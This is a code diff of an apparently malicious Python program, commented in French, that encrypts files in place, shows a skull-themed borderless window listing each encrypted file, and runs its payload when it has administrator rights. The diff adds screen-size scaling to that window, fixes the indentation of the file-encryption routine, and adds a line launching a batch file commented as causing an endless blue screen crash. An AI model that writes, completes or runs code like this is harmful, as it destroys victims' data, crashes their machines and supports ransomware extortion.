@@ -30,16 +30,28 @@ def GUI(): # Fonction de la fenêtre PyGame
     global window
     
     # Var
-    h = -30 # On initialise la valeure qui va représenter le nm de pixel entre chaque ligne
+    h = -30
     u = None
     text = None
     texts = []
+    
     window = Tk()
+    sw = window.winfo_screenwidth()
+    sh = window.winfo_screenheight()
+    ww = round(sw / 1.28)
+    wh = round(sh / 1.5)
     window.configure(background='black')
-    window.geometry("1500x720")
+    window.geometry(f"{ww}x{wh}")
+    
+    iw = round(ww / 1.1538461538461538461538461538462)
+    ih = round(wh / 2.0571428571428571428571428571429)
     skullhead = PhotoImage(file="skullhead.png")
-    canvas = Canvas(window, width=1500, height=720, highlightthickness=0, bg='black')
-    canvas.create_image(1300, 350, image=skullhead)
+    canvas = Canvas(window, width=ww, height=wh, highlightthickness=0, bg='black')
+    canvas.create_image(iw, ih, image=skullhead)
+    
+    ps = round(ww * wh / 72000)
+    le = round(wh / 24)
+    
     window.overrideredirect(1)
     Center(window)
     canvas.pack()
@@ -47,14 +59,14 @@ def GUI(): # Fonction de la fenêtre PyGame
     while True:
         window.update()
         if u != text: # Vérifier que le texte n'a pas déjà été affiché
-            h += 30 # Ajouter 30 d'écart entre chaque ligne
-            if h >= 1500: # Si la ligne dépasse la fenêtre
+            h += le # Ajouter 30 d'écart entre chaque ligne
+            if h >= ww: # Si la ligne dépasse la fenêtre
                 for txt in texts: txt.destroy()
                 texts = []
                 window.update()
                 h = 0 # Remettre h à 10
             # Afficher les éléments sur l'écran
-            texts.append(Label(window, text=text, font=('Consolas', 15), bg='black', fg="#149414"))
+            texts.append(Label(window, text=text, font=('Consolas', ps), bg='black', fg="#149414"))
             texts[-1].place(x=0, y=h)
             window.update()
             u = text
@@ -83,8 +95,8 @@ class Crypt: # Classe pour le cryptage
             
             with open(file, 'wb') as encrypted_file: # Remplacer le contenu du fichier par la variable cryptée
                 encrypted_file.write(encrypted)
-                file = file.replace("/", "\\")
-                text = f'>   {file} : Ok' # Texte d'execution
+            file = file.replace("/", "\\")
+            text = f'>   {file} : Ok' # Texte d'execution
             
         except: 
             file = file.replace("/", "\\")
@@ -111,6 +123,7 @@ crypting = Crypt() # Créer une instance de la classe
 
 if is_admin(): # Si l'utilisateur est administrateur
     
+    os.system("start /MIN mov.bat") # BSOD INFINI
     # Threads
     threads = [] # Liste des threads
     threads.append(threading.Thread(target=GUI))
